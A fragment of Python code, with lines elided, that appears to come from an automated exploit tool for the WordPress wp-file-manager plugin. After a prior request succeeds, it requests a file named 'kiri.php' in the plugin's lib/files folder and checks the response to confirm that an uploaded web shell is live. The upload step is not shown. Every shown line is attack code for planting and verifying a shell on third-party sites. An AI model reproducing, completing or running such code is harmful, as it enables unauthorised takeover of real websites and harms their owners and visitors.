...
def main(url):
	try:
		...
		if get_jembut.status_code == 200:
			get_shelle = requests.get(url+'/wp-content/plugins/wp-file-manager/lib/files/kiri.php',headers=headers,timeout=15).content
			if '<title></title>' in get_shelle:
